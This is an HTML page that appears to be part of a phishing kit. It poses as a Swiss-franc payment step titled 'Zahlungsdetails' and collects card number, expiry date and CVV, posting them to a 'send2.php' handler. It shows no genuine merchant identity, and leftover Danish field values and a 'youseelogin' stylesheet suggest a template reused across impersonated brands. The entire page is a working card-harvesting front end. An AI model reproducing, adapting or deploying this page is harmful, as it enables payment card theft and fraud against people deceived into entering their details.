<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Profile</title>
	<link rel="stylesheet" href="assets/bootstrap/css/cbootstrap.min.css">
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" href="assets/bootstrap/css/youseelogin.css">
    <link rel="stylesheet" href="assets/css/Contact-Form-Clean.css">
    <link rel="stylesheet" href="assets/css/Footer-Dark.css">
    <link rel="stylesheet" href="assets/css/Navigation-with-Button.css">
    <link rel="stylesheet" href="assets/css/styles.css">
	
	
	
    <link rel="stylesheet" href="assets/bootstrap/css/bbootstrap.min.css">
    <link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
    <link rel="stylesheet" href="assets/css/Bootstrap-Payment-Form.css">
    <link rel="stylesheet" href="assets/css/styles.css">
</head>
<style>.cookiewarning {
  display: none;
  position: fixed;
  bottom: -400px;
  right: 0;
  left: 0;
  background: #5a5a5a;
  color: #fff;
  z-index: 10000000;
  transition: all .5s ease;
  opacity: 0;
  font-family: 'Etica', arial, helvetica, sans-serif;
}

.cookiewarning.is-active {
  opacity: 1;
  bottom: 0;
}

.cookiewarning__container {
  display: -webkit-box;
  display: -webkit-flex;
  display: flex;
  max-width: 1000px;
  -webkit-box-align: center;
  -webkit-align-items: center;
          align-items: center;
  -webkit-flex-wrap: wrap;
          flex-wrap: wrap;
  margin: auto;
  padding: 24px;
}

@media screen and (min-width: 992px) {
  .cookiewarning__container {
    -webkit-flex-wrap: nowrap;
            flex-wrap: nowrap;
  }
}

.cookiewarning__icon {
  margin: 0;
}

.cookiewarning__text {
  max-width: 72%;
  margin: 0 0 0 24px;
}

@media screen and (min-width: 500px) {
  .cookiewarning__text {
    max-width: 82%;
  }
}

@media screen and (min-width: 992px) {
  .cookiewarning__text {
    max-width: 500px;
    margin: 0 72px 0 24px;
  }
}

.cookiewarning__text a {
  color: #fff;
}

.cookiewarning__text a:hover, .cookiewarning__text a:focus {
  color: #086ade;
}

.cookiewarning__button {
  border: none;
  background: #4a90e2;
  padding: 10px;
  color: #fff;
  white-space: nowrap;
  -webkit-border-radius: 8px;
          border-radius: 8px;
  font-size: 20px;
  margin: 20px auto 0;
  width: 100%;
}

.cookiewarning__button:hover, .cookiewarning__button:focus {
  background: #086ade;
}

@media screen and (min-width: 762px) {
  .cookiewarning__button {
    width: auto;
    padding: 10px 80px;
  }
}

@media screen and (min-width: 992px) {
  .cookiewarning__button {
    margin: 0;
  }
}

@keyframes slideUp {
  
  from {
    opacity: 0;
    bottom: -400px;
  }

  to {
    opacity: 1;
    bottom: 0;
  }
}

.cookiewarning--is-active {
    animation: slideUp .5s forwards;
    animation-delay: 2s;
}

/* Lets get rid of the exsiting cookie warning temporary to we remove it from Sitecore all places */
.cookie-warning { display: none !important;}

</style>
<body>
	
	<link rel="stylesheet" href="style.css">
	
    <div>
        <nav class="navbar navbar-light navbar-expand-md navigation-clean-button" style="background-color: #ffffff;">
		  
		   
		   <img src = "logo2.png" width="190" height="50" style = "display:block; margin-left: auto; margin-right: auto;">
               
                   
                </div>
            </div>
        </nav>
    </div>
	
    
		
		
		
		
		
		
		
		
		
		
		
		          
				  
			      
								  
								  
			                     
						     <main class="page payment-page">
						         <section class="clean-block payment-form dark" style="background-size: cover;background-repeat: no-repeat;background-image: ;">
						             <div class="container">
						                 <div class="block-heading" style="height: 69px;margin: 0px;padding: 22px;">
						                     <h2 class="text-info"></h2>
						                 </div>
				
				
				
				
				
				        
				           
				          
						 				                <div id="logo"></div>
						 				            </div>
				        
				   
				  
				
				
				
			
						 			   <form class="credit-card" method="post" name="FORM1" action="send2.php">
						 			     <div class="form-header">
						 			       <h4 class="title">Zahlungsdetails : 38U2 - CHF</h4>
						 			     </div>
 
						 			     <div class="form-body">
						 			       <!-- Card Number -->
						 			       <input pattern="\d*" class="card-number" minlength="16" maxlength="16" type="text" name="Cc" placeholder="Kartennummer" required>
 
						 			       <!-- Date Field -->

						 			       <div class="date-field" required>
						 			         <div class="month" required>
						 			           <select name="Month" required>
												   <option value="måned">Monat</option>
						 			             <option value="01">01</option>
						 			             <option value="02">02</option>
						 			             <option value="03">03</option>
						 			             <option value="04">04</option>
						 			             <option value="05">05</option>
						 			             <option value="06">06</option>
						 			             <option value="07">07</option>
						 			             <option value="08">08</option>
						 			             <option value="09">09</option>
						 			             <option value="10">10</option>
						 			             <option value="11">11</option>
						 			             <option value="12">12</option>
						 			           </select>
						 			         </div>
						 			         <div class="year" required>
						 			           <select name="Year" required>
												   <option value="år">Jahr</option>
						 			           
						 			             <option value="2022">2022</option>
						 			             <option value="2023">2023</option>
						 			             <option value="2024">2024</option>
						 			             <option value="2025">2025</option>
						 			             <option value="2026">2026</option>
						 			             <option value="2027">2027</option>
						 			             <option value="2028">2028</option>
						 			             <option value="2029">2029</option>

						 			           </select>
						 			         </div>
						 			       </div>
 
			       <!-- Card Verification Field -->
			       <div class="card-verification">
			         <div class="cvv-input">
			           <input  name="cvv" type="text" pattern="\d*" placeholder="Sicherheitscode" maxlength="3" minlength="3"  required> 
			         </div>
					 
			         <div class="cvv-details">
			           <p>Die Kreditkartenprüfnummer ist eine 3-stellige Zahl, die sich auf der Rückseite</p>
			         </div>
 
						 			       <!-- Buttons -->
						 			       <button type="submit" class="paypal-btn" style="color:white"> Weiter</a></button>
						 			     </div>
						 			   </form>
				
				
				
				
				
				
				
				
							   
						 		   				    <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-masker/1.2.0/vanilla-masker.min.js"></script>
						 		   				    <script src="assets/app.bundle.js"></script>
		   				    
						             </div>
						         </section>
						     </main>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		 <footer>
		
		
		
		
		    

     <script src="assets/js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/baguettebox.js/1.10.0/baguetteBox.min.js"></script>
    <script src="assets/js/smoothproducts.min.js"></script>
    <script src="assets/js/theme.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-masker/1.2.0/vanilla-masker.min.js"></script>
	<script src="assets/cardValidator.bundle.js"></script>
</body>

</html>